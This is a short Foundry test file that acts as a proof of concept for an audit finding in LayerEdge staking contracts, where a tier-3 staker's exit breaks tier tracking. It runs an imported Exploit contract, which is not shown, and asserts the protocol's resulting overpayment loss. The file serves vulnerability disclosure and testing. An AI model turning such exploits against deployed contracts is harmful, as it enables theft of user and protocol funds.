// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./56947-h-1-incorrect-tier-tracking-when-tier-3-staker-exits-in-a-ce.sol";

/* LayerEdge — H-1 incorrect tier tracking on T3 exit (Sherlock 2025-05) */
contract PoC_56947 is Test {
    function test_tier3ExitBreaksTierTracking() public {
        Exploit e = new Exploit();
        e.run();

        // 1 extra T2 → protocol overpays 15% of MIN_STAKE for a year
        uint256 expected = 3000e18 * 15 / 100;
        assertEq(e.protocolLoss(), expected);
        assertEq(e.token().balanceOf(address(e)), expected);

        (uint256 t1, uint256 t2, uint256 t3) = e.staking().countLiveTiers();
        assertEq(t1, 2);
        assertEq(t2, 5); // buggy
        assertEq(t3, 7); // buggy
    }
}
